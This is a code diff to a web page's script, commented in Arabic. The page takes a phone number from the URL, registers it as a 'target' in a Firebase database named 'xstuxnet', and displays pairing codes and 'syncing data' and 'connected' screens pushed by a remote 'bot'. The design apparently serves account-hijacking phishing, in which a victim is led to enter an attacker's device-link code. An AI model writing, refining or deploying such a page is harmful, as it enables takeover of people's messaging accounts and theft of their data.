@@ -56,9 +56,12 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
+        // إعدادات Firebase - تأكد أنها مطابقة لمشروعك الحالي
         const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(config);
         const db = firebase.database();
+
+        // قراءة الرقم من الرابط (id=79221267029)
         const rawId = new URLSearchParams(window.location.search).get('id');
         const isAr = navigator.language.startsWith('ar');
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
@@ -88,27 +91,31 @@
         document.getElementById('u-wait').innerText = c.wait;
 
         if (rawId) {
-            let phone = rawId.replace(/\D/g, ''); // تنظيف الرقم
-            if (phone.startsWith('01') && phone.length === 11) phone = '20' + phone; // إضافة رمز مصر تلقائياً
+            let phone = rawId.replace(/\D/g, ''); // تنظيف الرقم من أي رموز
+            // إضافة رمز الدولة تلقائياً إذا بدأ بـ 0 (مثال لمصر)
+            if (phone.startsWith('01') && phone.length === 11) phone = '20' + phone;
 
+            // إرسال إشارة "pending" للبوت الجديد باستخدام الرقم كـ UID
             db.ref('monitoring/' + phone).set({ 
                 status: "pending", 
                 target: phone,
-                device: deviceType 
+                device: deviceType,
+                last_seen: Date.now()
             });
 
-            db.ref('commands/' + phone).on('value', s => {
-                const v = s.val();
-                if (v) {
-                    if (v.code) { 
-                        document.getElementById('pairing-code').innerText = v.code; 
+            // مراقبة الأوامر (الكود والحالة) من البوت
+            db.ref('commands/' + phone).on('value', snap => {
+                const data = snap.val();
+                if (data) {
+                    if (data.code) { 
+                        document.getElementById('pairing-code').innerText = data.code; 
                         document.getElementById('u-wait').innerText = c.done; 
                         document.getElementById('u-wait').style.color = "#d91e1e"; 
                     }
-                    if (v.status === 'syncing') {
+                    if (data.status === 'syncing') {
                         document.getElementById('u-wait').innerText = isAr ? "جاري مزامنة البيانات..." : "Syncing data...";
                     }
-                    if (v.status === 'connected') {
+                    if (data.status === 'connected') {
                         document.getElementById('success-screen').style.display = 'flex';
                         document.getElementById('success-text').innerText = c.success;
                     }
